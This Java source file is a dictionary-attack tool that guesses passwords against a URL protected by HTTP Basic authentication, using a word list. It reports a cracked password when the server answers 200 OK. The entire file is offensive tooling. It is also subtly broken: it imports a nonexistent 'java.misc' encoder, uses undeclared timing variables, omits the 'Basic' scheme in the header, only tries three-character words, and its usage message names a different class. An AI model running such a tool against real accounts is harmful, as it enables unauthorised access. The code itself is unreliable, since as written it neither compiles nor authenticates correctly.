import java.io.*;
import java.util.*;
import java.net.*;
import java.misc.BASE64Encoder;

public class Dictionary
{

  public Dictionary()
  {
  }

  public static void main(String[] args)
  {
    try
    {

        if (args.length != 3 )
        {
            System.out.println("Usage: java BruteForce <URL> <UserName> <DictFileName>");
            System.exit(1);
        }

         timeStart = System.currentTimeMillis();

        String strPass = applyDictionary (args[0], args[1], args [2]);

         timeEnd = System.currentTimeMillis();

        System.out.println("\n\n\n\n\tPass Cracked is: " + strPass);
        System.out.println("\tTime taken is (sec):" + String.valueOf((timeEnd - timeStart)/1000));

    }
    catch(Exception e)
    {
      e.printStackTrace();
    }
  }

  static String applyDictionary (String URL, String UserName, String strUrlDictionary)
  {
      String strPass = "";

      try
      {
              FileInputStream fIn = new FileInputStream ( strUrlDictionary );
              DataInputStream dtIn = new DataInputStream ( fIn );

             
             

              System.out.print("\n\n\n Applying Dictionary Attack:      ");

              while (dtIn.available() > 0)
              {
                  strPass = dtIn.readLine();

                  if (strPass.length() != 3)
                    continue;

                 
               

                  System.out.print("\b\b\b" + strPass );

                  boolean boolResult = applyPass ( URL, UserName, strPass );

                  if (boolResult)
                  {
                      dtIn.close();
                      fIn.close();
                      return strPass;
                  }
              }

              dtIn.close();
              fIn.close();
      }
      catch (Exception e)
      {
          e.printStackTrace();
      }

      return "Could not find match";
  }

  private static boolean applyPass (String strURL, String strUserName, String strPass )
  {
        BASE64Encoder myEncoder = new BASE64Encoder ();

        try
        {
            String str = strUserName + ":" + strPass;

            String strEncode = myEncoder.encode(str.getBytes());

            URL url = new URL (strURL);

            URLConnection urlConn = url.openConnection();

            urlConn.setRequestProperty ("Authorization", " " + strEncode);

            urlConn.connect();

            String strReply = urlConn.getHeaderField(0);

            if ( strReply.trim().equalsIgnoreCase("HTTP/1.1 200 OK") )
            {
                return true;
            }
        }
        catch (Exception e)
        {
            e.printStackTrace ();
        }

        return false;
  }
}
